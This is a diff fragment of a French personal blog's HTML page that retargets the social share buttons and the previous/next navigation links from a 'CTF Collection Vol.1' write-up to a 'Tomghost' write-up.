+<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fblog.hugoblanc.com%2fposts%2ftomghost-writeup%2f&amp;title=Write-up%20%7c%20Tomghost&amp;summary=Write-up%20%7c%20Tomghost&amp;source=https%3a%2f%2fblog.hugoblanc.com%2fposts%2ftomghost-writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
   <div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg>
     </div>
@@ -324,7 +356,7 @@ Un petit tour sur <a href="https://www.guballa.de/vigenere-solver">guballa.de</a
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https%3a%2f%2fblog.hugoblanc.com%2fposts%2fctf-collection-vol1%2f&amp;resubmit=true&amp;title=Write-up%20%7c%20CTF%20Collection%20Vol.1" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
+<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https%3a%2f%2fblog.hugoblanc.com%2fposts%2ftomghost-writeup%2f&amp;resubmit=true&amp;title=Write-up%20%7c%20Tomghost" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
   <div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968 0 1.754.786 1.754 1.754 0 .716-.435 1.333-1.01 1.614a3.111 3.111 0 0 1 .042.52c0 2.694-3.13 4.87-7.004 4.87-3.874 0-7.004-2.176-7.004-4.87 0-.183.015-.366.043-.534A1.748 1.748 0 0 1 4.028 12c0-.968.786-1.754 1.754-1.754.463 0 .898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342 0 0 1 .14-.197.35.35 0 0 1 .238-.042l2.906.617a1.214 1.214 0 0 1 1.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687 0 1.248-.561 1.248-1.249 0-.688-.561-1.249-1.249-1.249zm5.5 0c-.687 0-1.248.561-1.248 1.25 0 .687.561 1.248 1.249 1.248.688 0 1.249-.561 1.249-1.249 0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327 0 0 0-.231.094.33.33 0 0 0 0 .463c.842.842 2.484.913 2.961.913.477 0 2.105-.056 2.961-.913a.361.361 0 0 0 .029-.463.33.33 0 0 0-.464 0c-.547.533-1.684.73-2.512.73-.828 0-1.979-.196-2.512-.73a.326.326 0 0 0-.232-.095z"/></svg>
     </div>
@@ -332,7 +364,7 @@ Un petit tour sur <a href="https://www.guballa.de/vigenere-solver">guballa.de</a
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2fblog.hugoblanc.com%2fposts%2fctf-collection-vol1%2f;title=Write-up%20%7c%20CTF%20Collection%20Vol.1" target="_blank" rel="noopener" aria-label="" title="Share on xing">
+<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2fblog.hugoblanc.com%2fposts%2ftomghost-writeup%2f;title=Write-up%20%7c%20Tomghost" target="_blank" rel="noopener" aria-label="" title="Share on xing">
   <div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M18.188 0c-.517 0-.741.325-.927.66 0 0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211 0 .375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016 0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894 0 21.686 0h-3.498zM3.648 4.74c-.211 0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016 0 .021L1.86 16.051c-.099.188-.093.381 0 .529.085.142.239.234.45.234h3.461c.518 0 .766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></svg>
     </div>
@@ -340,7 +372,7 @@ Un petit tour sur <a href="https://www.guballa.de/vigenere-solver">guballa.de</a
 </a>
 
 
-<a class="resp-sharing-button__link" href="whatsapp://send?text=Write-up%20%7c%20CTF%20Collection%20Vol.1%20https%3a%2f%2fblog.hugoblanc.com%2fposts%2fctf-collection-vol1%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
+<a class="resp-sharing-button__link" href="whatsapp://send?text=Write-up%20%7c%20Tomghost%20https%3a%2f%2fblog.hugoblanc.com%2fposts%2ftomghost-writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
   <div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
     </div>
@@ -348,7 +380,7 @@ Un petit tour sur <a href="https://www.guballa.de/vigenere-solver">guballa.de</a
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fblog.hugoblanc.com%2fposts%2fctf-collection-vol1%2f&amp;t=Write-up%20%7c%20CTF%20Collection%20Vol.1" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
+<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fblog.hugoblanc.com%2fposts%2ftomghost-writeup%2f&amp;t=Write-up%20%7c%20Tomghost" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
   <div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
 			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
     </div>
@@ -356,7 +388,7 @@ Un petit tour sur <a href="https://www.guballa.de/vigenere-solver">guballa.de</a
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=Write-up%20%7c%20CTF%20Collection%20Vol.1&amp;url=https%3a%2f%2fblog.hugoblanc.com%2fposts%2fctf-collection-vol1%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
+<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=Write-up%20%7c%20Tomghost&amp;url=https%3a%2f%2fblog.hugoblanc.com%2fposts%2ftomghost-writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
   <div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
       <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
     </div>
@@ -374,18 +406,11 @@ Un petit tour sur <a href="https://www.guballa.de/vigenere-solver">guballa.de</a
 
         <div class="pagination__buttons">
           
-            <span class="button previous">
-              <a href="https://blog.hugoblanc.com/posts/tomghost-writeup/">
-                <span class="button__icon">←</span>
-                <span class="button__text">Write-up | Tomghost</span>
-              </a>
-            </span>
-          
 
           
             <span class="button next">
-              <a href="https://blog.hugoblanc.com/posts/cc-pentesting-writeup/">
-                <span class="button__text">Write-up | CC: Pen Testing</span>
+              <a href="https://blog.hugoblanc.com/posts/ctf-collection-vol1/">
+                <span class="button__text">Write-up | CTF Collection Vol.1</span>
                 <span class="button__icon">→</span>
               </a>
             </span>
